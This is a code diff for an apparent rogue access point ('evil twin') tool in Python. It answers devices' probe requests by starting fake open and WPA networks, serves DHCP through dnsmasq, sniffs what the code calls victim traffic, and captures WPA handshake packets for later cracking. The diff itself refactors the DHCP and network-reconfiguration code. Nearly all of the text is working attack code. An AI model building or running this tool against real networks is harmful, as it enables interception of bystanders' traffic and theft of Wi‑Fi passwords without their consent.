@@ -13,14 +13,13 @@ from threading import Thread
 from colorama import Fore
 import argparse
 
+
 TIMEOUT = 20
 TIMEOUT_CLIENT_RECONNECT = 5
 CHANNEL_HOPPING_TIMEOUT = 2
 CLIENT_MONITOR_TIMEOUT = 2
 oui = MacLookup()
 conf.verb = 0
-DEFAULT_NETWORK = "11.0.0.1/24"
-DEFAULT_IP = "11.0.0.1"
 
 def on_probe(essid, sta, freq, signal, vendor):
 	for script in os.listdir("on_probe"):
@@ -70,6 +69,8 @@ class Hostapd:
 		self.__client_monitor_thr = Thread(target=self.client_monitor)
 		self.__status_thr.start()
 		self.__client_monitor_thr.start()
+		self.dhcpd = None
+		self.network = None
 
 	def wait(self, max_waiting_time):
 		begin = time()
@@ -130,6 +131,12 @@ class Hostapd:
 			if self.is_shutdown:
 				break
 
+	def change_network_settings(self, network):
+		DEBUG("ifconfig {iface} {network}".format(iface=self.iface, network=network))
+		os.system("ifconfig {iface} {network}".format(iface=self.iface, network=network))
+		self.network = IPNetwork(network)
+
+
 class Hostapd_OPN(Hostapd):
 	name = "OPN"
 	file = "/tmp/ap_opn.conf"
@@ -161,41 +168,34 @@ wpa_passphrase={password}
 '''
 
 class DHCPD:
-	GW_IP = '11.0.0.1'
-	BROADCAST = '11.0.0.255'
-	NETMASK = '255.255.255.0'
-	DNS_IP = '8.8.8.8'
-	#DOMAIN = 'test.local'
-	NBN_IP = '11.0.0.1'
-
-	def __init__(self, iface):
+	file = "/tmp/dhcp_{iface}.conf"
+	config = '''domain=fake.net
+interface={iface}
+dhcp-range={ip_start},{ip_end},24h
+dhcp-option=1,{mask}
+dhcp-option=3,{ip_gw}
+'''
+	def __init__(self, iface, network):
 		self.iface = iface
+		net = IPNetwork(network)
+		self.ip_start = str(net[10])
+		self.ip_end = str(net[20])
+		self.mask = str(net.netmask)
+		self.ip_gw = str(net[1])
+		self.is_up = False
 		self.is_shutdown = False
-		self.dhcp_pool = ['11.0.0.11', '11.0.0.12', '11.0.0.13', '11.0.0.14', '11.0.0.15']
-		self.ip = self.dhcp_pool.pop(0)
-		Thread(target=self.start).start()
-
-	def start(self):
-		while not self.is_shutdown:
-			sniff(iface=self.iface, prn=listen_dhcp, timeout=1, store=0)
+		self.clients = {}
+		self.file = self.file.format(iface=iface)
+		with open(self.file, "w") as f:
+			f.write(self.config.format(iface=self.iface, ip_start=self.ip_start, ip_end=self.ip_end, mask=self.mask, ip_gw=self.ip_gw))
+		self.dhcpd = subprocess.Popen(["dnsmasq", "--conf-file="+self.file, "-d", "-p0"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
 
 	def stop(self):
 		self.is_shutdown = True
-
-	def send_offer(self, client_ip, client_mac, transaction=0):
-		p = Ether(dst='ff:ff:ff:ff:ff:ff')/IP(dst='255.255.255.255', src=__class__.GW_IP)/\
-			UDP(sport=67, dport=68)/\
-			BOOTP(op=2, yiaddr=client_ip, siaddr='0.0.0.0', giaddr='0.0.0.0', chaddr=mac2str(client_mac), xid=transaction)/\
-			DHCP(options=[("message-type", "offer"), ("server_id", __class__.GW_IP), ("broadcast_address", __class__.BROADCAST), ("router", __class__.GW_IP), ("subnet_mask", __class__.NETMASK), ('name_server', __class__.DNS_IP), ('NetBIOS_server', __class__.NBN_IP), 'end'])
-		sendp(p, iface=self.iface)
-
-	def send_ack(self, client_ip, client_mac, transaction=0):
-		p = Ether(dst='ff:ff:ff:ff:ff:ff')/IP(dst='255.255.255.255', src=__class__.GW_IP)/\
-			UDP(sport=67, dport=68)/\
-			BOOTP(op=2, yiaddr=client_ip, siaddr='0.0.0.0', giaddr='0.0.0.0', chaddr=mac2str(client_mac), xid=transaction)/\
-			DHCP(options=[("message-type", "ack"), ("server_id", __class__.GW_IP), ("broadcast_address", __class__.BROADCAST), ("router", __class__.GW_IP), ("subnet_mask", __class__.NETMASK), ('name_server', __class__.DNS_IP), ('NetBIOS_server', __class__.NBN_IP), 'end'])
-		sendp(p, iface=self.iface)
-
+		self.dhcpd.terminate()
+		sleep(1)
+		#self.dhcpd.kill()
+		self.dhcpd.wait()
 
 def get_time():
 	return datetime.now().strftime("%H:%M:%S")
@@ -256,7 +256,7 @@ hostapd_wpa = None
 hostapd_wpa_is_start = False
 victim_trafic = PacketList()
 def start_AP_OPN(iface, essid):
-	global hostapd_opn, hostapd_opn_is_start, victim_trafic, handshakes, dhcpd, stop_hopping, known_targets
+	global hostapd_opn, hostapd_opn_is_start, victim_trafic, handshakes, stop_hopping, known_targets
 
 	stop_hopping = True
 	
@@ -266,20 +266,21 @@ def start_AP_OPN(iface, essid):
 
 	hostapd_opn = try_to_start_hostapd(Hostapd_OPN, iface, essid, password=False, max_attempts=5)
 	if hostapd_opn.is_up:
-		dhcpd = DHCPD(iface)
+		hostapd_opn.change_network_settings("11.0.0.1/24")
+		hostapd_opn.dhcpd = DHCPD(iface, "11.0.0.1/24")
 		INFO("run {num} OPN network \"{essid}\"".format(num=pcap_no, essid=essid))
 		on_network(essid, iface)
 		begin = time()
 		while time() - begin < TIMEOUT: # waiting first client
-			victim_trafic = sniff(iface=iface, prn=parse_client_trafic, timeout=1)
+			victim_trafic = sniff(iface=iface, prn=parse_client_trafic_OPN, timeout=1)
 			if handshakes: # if it was WPA network
 				break
 		while hostapd_opn.clients and not handshakes:
 			try:
-				victim_trafic += sniff(iface=iface, prn=parse_client_trafic, timeout=TIMEOUT_CLIENT_RECONNECT) # waiting during client won't disconnected
+				victim_trafic += sniff(iface=iface, prn=parse_client_trafic_OPN, timeout=TIMEOUT_CLIENT_RECONNECT) # waiting during client won't disconnected
 			except KeyboardInterrupt:
 				break
-		dhcpd.stop()
+		hostapd_opn.dhcpd.stop()
 		hostapd_opn.shutdown()
 		#if victim_trafic:
 		#	save(victim_trafic, network_name=essid)
@@ -288,7 +289,6 @@ def start_AP_OPN(iface, essid):
 		hostapd_opn.shutdown()
 		ERROR("network OPN \"{essid}\" wasn't started".format(essid=essid))
 
-	dhcpd = None
 	#stop_hopping = False
 	hostapd_opn = None
 	victim_trafic = PacketList()
@@ -297,18 +297,18 @@ def start_AP_OPN(iface, essid):
 
 handshakes = []
 def start_AP_WPA(iface, essid):
-	global hostapd_wpa, hostapd_wpa_is_start, handshakes, victim_trafic, known_targets, dhcpd
+	global hostapd_wpa, hostapd_wpa_is_start, handshakes, victim_trafic, known_targets
 
 	if hostapd_wpa_is_start:
 		return
 	hostapd_wpa_is_start = True
-	dhcpd = False
 
 	password = get_password(essid)
 	hostapd_wpa = try_to_start_hostapd(Hostapd_WPA, iface, essid, password, max_attempts=5)
 	if hostapd_wpa.is_up:
 		if password:
-			dhcpd = DHCPD(iface)
+			hostapd_wpa.change_network_settings("12.0.0.1/24")
+			hostapd_wpa.dhcpd = DHCPD(iface, "12.0.0.1/24")
 		INFO("run {num} WPA network \"{essid}\" \"{password}\"".format(num=pcap_no, essid=essid, password=password if password else ""))
 		on_network(essid, iface)
 		m1 = False
@@ -327,11 +327,11 @@ def start_AP_WPA(iface, essid):
 					WARN("handshake: %d EAPOL packets (M1/M2)" % len(handshakes))
 					break
 			else:
-				sniff(iface=iface, prn=parse_client_trafic, timeout=1)
+				sniff(iface=iface, prn=parse_client_trafic_WPA, timeout=1)
 				if hostapd_opn and hostapd_opn.clients:
 					break
-		if dhcpd:
-			dhcpd.stop()
+		if hostapd_wpa.dhcpd:
+			hostapd_wpa.dhcpd.stop()
 		hostapd_wpa.shutdown()
 		if handshakes and not password:
 			handshakes.append(get_beacon(essid))
@@ -344,7 +344,6 @@ def start_AP_WPA(iface, essid):
 		hostapd_wpa.shutdown()
 		ERROR("network WPA \"{essid}\" wasn't started".format(essid=essid))
 
-	dhcpd = None
 	hostapd_wpa = None
 	handshakes = []
 	known_targets.clear()
@@ -394,48 +393,37 @@ def parse_raw_80211(p):
 			known_essids.add(essid)'''
 				
 known_targets = set()
-gw_ip = DEFAULT_IP
-def parse_client_trafic(p):
-	global known_targets, gw_ip
+def parse_client_trafic_OPN(p):
+	global known_targets, hostapd_opn
 	if IP in p:
-		if p[IP].src in ("0.0.0.0", "127.0.0.1", gw_ip):
+		if p[IP].src in ("0.0.0.0", "127.0.0.1", hostapd_opn.dhcpd.ip_gw if hostapd_opn.dhcpd else "") :
 			return
 		if p[IP].src in known_targets or p[IP].dst in known_targets:
 			return
 		client_mac = p[Ether].src
 		client_ip = p[IP].src
-		gw_ip = str( IPNetwork("{ip}/24".format(ip=client_ip))[1] )
+		ip_gw = str( IPNetwork("{ip}/24".format(ip=client_ip))[1] )
 		WARN("client {mac} {ip}".format(mac=client_mac, ip=client_ip))
 		known_targets.add(client_ip)
-		change_network_settings("{ip}/24".format(ip=gw_ip))
-		on_client(client_ip, client_mac, gw_ip)
+		if not client_ip in hostapd_opn.network:
+			hostapd_opn.change_network_settings("{ip}/24".format(ip=ip_gw))
+		on_client(client_ip, client_mac, ip_gw)
 
-dhcpd = None
-def listen_dhcp(p):
-	global DHCPD, dhcpd
-	if dhcpd and BOOTP in p:
-		if p[BOOTP].op == 1: # DISCOVER/REQUEST
-			client_mac = p[Ether].src
-			vendor_class_id = ''
-			hostname = ''
-			requested_addr = ''
-			transaction = p[BOOTP].xid
-			for option in p[DHCP].options:
-				if 'vendor_class_id' in option:
-					vendor_class_id = option[1]
-				elif 'hostname' in option:
-					hostname = option[1]
-				elif 'requested_addr' in option:
-					requested_addr = option[1]
-			if not requested_addr:
-				NOTICE("DHCP discover {vendor} {hostname}".format(vendor=vendor_class_id, hostname=hostname))
-				dhcpd.send_offer(dhcpd.ip, client_mac, transaction)
-				NOTICE("DHCP offer {ip} {gw} {mask} {dns}".format(ip=dhcpd.ip, gw=DHCPD.GW_IP, mask=DHCPD.NETMASK, dns=DHCPD.DNS_IP))
-			else:
-				NOTICE("DHCP request {vendor} {hostname} {ip}".format(vendor=vendor_class_id, hostname=hostname, ip=requested_addr))
-				dhcpd.send_ack(requested_addr, client_mac, transaction)
-				NOTICE("DHCP ack {ip} {gw} {mask} {dns}".format(ip=requested_addr, gw=DHCPD.GW_IP, mask=DHCPD.NETMASK, dns=DHCPD.DNS_IP))
-				dhcpd.ip = dhcpd.dhcp_pool.pop(0) if len(dhcpd.dhcp_pool) > 1 else dhcpd.dhcp_pool[0]
+def parse_client_trafic_WPA(p):
+	global known_targets, hostapd_wpa
+	if IP in p:
+		if p[IP].src in ("0.0.0.0", "127.0.0.1", hostapd_wpa.dhcpd.ip_gw if hostapd_wpa.dhcpd else ""):
+			return
+		if p[IP].src in known_targets or p[IP].dst in known_targets:
+			return
+		client_mac = p[Ether].src
+		client_ip = p[IP].src
+		ip_gw = str( IPNetwork("{ip}/24".format(ip=client_ip))[1] )
+		WARN("client {mac} {ip}".format(mac=client_mac, ip=client_ip))
+		known_targets.add(client_ip)
+		if not client_ip in hostapd_wpa.network:
+			hostapd_wpa.change_network_settings("{ip}/24".format(ip=ip_gw))
+		on_client(client_ip, client_mac, ip_gw)
 
 def get_beacon(essid):
 	radio = RadioTap(len=18, present=0x482e,Rate=2,Channel=2412,ChannelFlags=0x00a0,dBm_AntSignal=chr(1),Antenna=1)
@@ -443,14 +431,6 @@ def get_beacon(essid):
 	beacon = Dot11Beacon(cap='ESS+privacy')
 	essid = Dot11Elt(ID='SSID',info=essid, len=len(essid))
 	return radio/dot11/beacon/essid
-
-def change_network_settings(network):
-	if args.opn:
-		DEBUG("ifconfig {iface} {network}".format(iface=args.opn, network=network))
-		os.system("ifconfig {iface} {network}".format(iface=args.opn, network=network))
-	elif args.wpa:
-		DEBUG("ifconfig {iface} {network}".format(iface=args.wpa, network=network))
-		os.system("ifconfig {iface} {network}".format(iface=args.wpa, network=network))
 
 def sniffer(iface):
 	sniff(iface=iface, prn=parse_raw_80211, store=0)
@@ -480,7 +460,6 @@ conf.iface = args.wpa
 wpa_mac = Ether().src
 conf.iface = origin
 
-change_network_settings(DEFAULT_NETWORK)
 sniffer_thr = Thread(target=sniffer, args=(args.mon,))
 sniffer_thr.start()
 sniffer_thr.join()
